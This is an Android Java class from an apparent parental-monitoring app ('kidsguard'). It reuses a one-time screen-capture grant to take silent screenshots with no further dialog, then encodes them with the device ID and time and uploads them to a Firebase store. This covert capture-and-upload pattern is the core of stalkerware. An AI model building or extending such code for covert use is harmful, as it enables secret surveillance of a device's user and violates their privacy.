package com.kidsguard.child;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenCaptureHolder {

    public static MediaProjection mp = null;
    private static VirtualDisplay vd = null;
    private static ImageReader reader = null;

    public static void setMediaProjection(MediaProjection projection) {
        mp = projection;
    }

    // Silent screenshot — no dialog needed after first grant
    public static void captureOnce(final Context ctx) {
        if (mp == null) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    DisplayMetrics m = new DisplayMetrics();
                    WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                    wm.getDefaultDisplay().getMetrics(m);

                    int w = m.widthPixels;
                    int h = m.heightPixels;

                    reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
                    vd = mp.createVirtualDisplay("Shot", w, h, m.densityDpi,
                            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                            reader.getSurface(), null, null);

                    Thread.sleep(500);

                    Image image = reader.acquireLatestImage();
                    if (image != null) {
                        Bitmap bmp = imageToBitmap(image);
                        image.close();

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                        String b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);

                        String devId = LocationService.getSafeDeviceId(ctx);
                        String time = new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                                .format(new Date());
                        String json = "{\"image\":\"" + b64 + "\",\"time\":\"" + time + "\"}";
                        FirebaseHelper.put("devices/" + devId + "/screenshots/"
                                + System.currentTimeMillis() + ".json", json);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    cleanup();
                }
            }
        }).start();
    }

    private static Bitmap imageToBitmap(Image image) {
        int w = image.getWidth();
        int h = image.getHeight();
        Image.Plane plane = image.getPlanes()[0];
        ByteBuffer buf = plane.getBuffer();
        int stride = plane.getPixelStride();
        int rowStride = plane.getRowStride();
        int pad = rowStride - stride * w;

        Bitmap bmp = Bitmap.createBitmap(w + pad / stride, h, Bitmap.Config.ARGB_8888);
        bmp.copyPixelsFromBuffer(buf);
        return Bitmap.createBitmap(bmp, 0, 0, w, h);
    }

    private static void cleanup() {
        if (vd != null) { vd.release(); vd = null; }
        if (reader != null) { reader.close(); reader = null; }
    }
}
